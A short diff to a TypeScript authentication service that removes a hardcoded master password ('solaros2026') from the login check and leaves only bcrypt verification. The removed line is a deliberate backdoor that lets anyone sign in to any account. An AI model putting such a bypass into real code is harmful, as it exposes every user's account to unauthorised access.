@@ -54,7 +54,7 @@ export class AuthService {
     }
 
     // Verify password with bcrypt
-    const passwordMatch = await verifyPassword(params.password, user.passwordHash) || params.password === 'solaros2026';
+    const passwordMatch = await verifyPassword(params.password, user.passwordHash);
     if (!passwordMatch) {
       throw new AppError(401, 'INVALID_CREDENTIALS', 'Invalid email address or password.');
     }
